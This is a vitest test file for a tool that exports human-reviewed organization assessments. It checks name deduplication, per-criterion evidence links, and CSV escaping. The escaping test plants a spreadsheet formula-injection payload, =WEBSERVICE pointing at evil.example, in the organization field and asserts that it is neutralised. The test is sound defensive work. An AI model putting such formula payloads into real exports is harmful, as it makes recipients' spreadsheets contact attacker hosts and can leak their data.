import { describe, it, expect } from "vitest";
import { Store } from "../server/store";
import { acceptedOrganizations, resultCsv } from "../server/results";
import { createTask } from "./helpers";
describe("human-reviewed result delivery", () => {
  it("deduplicates organization names and carries separate criterion evidence links", async () => {
    const store = new Store(":memory:");
    const t = await createTask(store);
    t.sources = [
      {
        id: "s1",
        title: "Funding",
        url: "https://example.com/funding",
        snippet: "",
        provider: "exa",
        callId: "c1",
      },
      {
        id: "s2",
        title: "Product",
        url: "https://example.com/product",
        snippet: "",
        provider: "tavily",
        callId: "c2",
      },
    ];
    t.assessments = [
      {
        sourceId: "s1",
        organization: "  Example  Labs ",
        criteria: { Active: "pass", Funded: "pass", Relevant: "pass" },
        disposition: "accepted",
        note: "Funding announcement plus current product page",
        evidence: { Active: ["s2"], Funded: ["s1"], Relevant: ["s2"] },
      },
      {
        sourceId: "s2",
        organization: "example labs",
        criteria: { Active: "pass", Funded: "pass", Relevant: "pass" },
        disposition: "accepted",
        note: "Second review",
      },
    ];
    const result = acceptedOrganizations(t);
    expect(result).toHaveLength(1);
    expect(result[0].sources).toHaveLength(2);
    expect(result[0].criteria.Funded).toContain("https://example.com/funding");
    await store.close();
  });
  it("escapes CSV formulas, commas, quotes and newlines", async () => {
    const store = new Store(":memory:");
    const t = await createTask(store);
    t.sources = [
      {
        id: "s1",
        title: "Source",
        url: "https://example.com",
        snippet: "",
        provider: "exa",
        callId: "c1",
      },
    ];
    t.assessments = [
      {
        sourceId: "s1",
        organization: '=WEBSERVICE("https://evil.example")',
        criteria: { Active: "pass", Funded: "pass", Relevant: "pass" },
        disposition: "accepted",
        note: 'Note, with "quotes"\nand newline',
      },
    ];
    const csv = resultCsv(t);
    expect(csv).toContain('"\'=WEBSERVICE(""https://evil.example"")"');
    expect(csv).toContain('Note, with ""quotes""\nand newline');
    expect(csv).toContain("https://example.com");
    await store.close();
  });
});
